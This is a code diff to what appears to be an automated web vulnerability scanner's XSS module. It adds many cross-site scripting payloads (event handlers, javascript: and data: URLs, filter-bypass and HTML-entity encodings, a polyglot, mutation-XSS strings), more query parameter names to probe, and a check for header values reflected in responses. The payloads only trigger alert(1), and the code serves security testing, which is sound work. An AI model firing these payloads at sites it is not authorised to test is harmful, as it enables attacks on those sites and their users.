@@ -14,24 +14,49 @@ PAYLOADS = [
     "<svg onload=alert(1)>",
     "<details open ontoggle=alert(1)>",
     "<body onload=alert(1)>",
+    "<iframe src=javascript:alert(1)>",
+    "<object data=javascript:alert(1)>",
+    "<embed src=javascript:alert(1)>",
     # Attribute context
     '" onmouseover="alert(1)',
     "' onmouseover='alert(1)",
     '" onfocus="alert(1)" autofocus="',
+    "' onfocus='alert(1)' autofocus='",
+    '" onclick="alert(1)"',
     # JavaScript context
     "'-alert(1)-'",
     "';alert(1)//",
     "</script><script>alert(1)</script>",
+    "'+alert(1)+'",
+    "-alert(1)-",
     # URL context
     "javascript:alert(1)",
+    "javascript:alert(1)//",
+    "data:text/html,<script>alert(1)</script>",
     # Filter bypass
     "<ScRiPt>alert(1)</sCrIpT>",
     "<img src=x onerror=alert&#40;1&#41;>",
     "<svg/onload=alert(1)>",
-    # Event handlers
-    "<input onfocus=alert(1) autofocus>",
-    "<iframe src=\"javascript:alert(1)\">",
+    "<img src=x onerror=alert(String.fromCharCode(49))>",
+    # Polyglots
+    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
+    '"><img src=x onerror=alert(1)>',
+    "'><script>alert(1)</script>",
+    '"><svg/onload=alert(1)>',
+    # Mutation XSS (mXSS)
+    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
     "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
+    "<svg><foreignObject><body onload=alert(1)>",
+    # Event handlers (more)
+    "<input onfocus=alert(1) autofocus>",
+    "<select onfocus=alert(1) autofocus>",
+    "<textarea onfocus=alert(1) autofocus>",
+    "<keygen onfocus=alert(1) autofocus>",
+    "<video><source onerror=alert(1)>",
+    "<audio src=x onerror=alert(1)>",
+    # Encoding bypass
+    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
+    "<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
 ]
 
 BENIGN = "rmw-baseline-check-12345"
@@ -40,6 +65,9 @@ BENIGN = "rmw-baseline-check-12345"
 PARAMS = [
     "q", "search", "name", "redirect", "next", "return", "page", "id",
     "query", "keyword", "term", "text", "message", "comment", "title",
+    "content", "body", "data", "value", "callback", "cb", "jsonp",
+    "cbk", "handler", "cbfunc", "redirect_uri", "return_url", "next_url",
+    "continue", "goto", "target", "dest", "url", "link", "href",
 ]
 
 
@@ -89,6 +117,30 @@ async def _probe_param(ctx, base: str, param: str) -> None:
             return  # One finding per param is enough
 
 
+async def _probe_header_xss(ctx, base: str) -> None:
+    """Check if HTTP headers are reflected in the response (header-based XSS)."""
+    marker = "rmwxss12345"
+    headers_to_test = ["User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP", "Accept-Language"]
+    for header in headers_to_test:
+        if not ctx.can_request():
+            return
+        ctx.increment()
+        resp = await ctx.http.get(base, headers={header: marker}, timeout=ctx.settings.timeout)
+        body = resp.text or ""
+        if marker in body:
+            ctx.add_finding(Finding(
+                id=f"xss-header-{header.lower().replace('-', '_')}",
+                title=f"Potential header-based XSS via '{header}'",
+                severity=Severity.MEDIUM,
+                confidence=0.7,
+                asset=base,
+                module="xss",
+                description=f"The {header} header value is reflected in the response, enabling header-based XSS.",
+                remediation="Sanitize and encode all HTTP header values before reflecting them.",
+                tags=["xss", "header-based", "reflected"],
+            ))
+
+
 async def run(ctx) -> None:
     base = f"https://{ctx.target}"
     try:
@@ -96,5 +148,9 @@ async def run(ctx) -> None:
         ctx.waf_type = detect_waf(resp.headers, resp.text)
     except Exception:
         ctx.waf_type = None
+
+    # Header-based XSS check
+    await _probe_header_xss(ctx, base)
+
     tasks = [_probe_param(ctx, base, param) for param in PARAMS]
     await asyncio.gather(*tasks, return_exceptions=True)
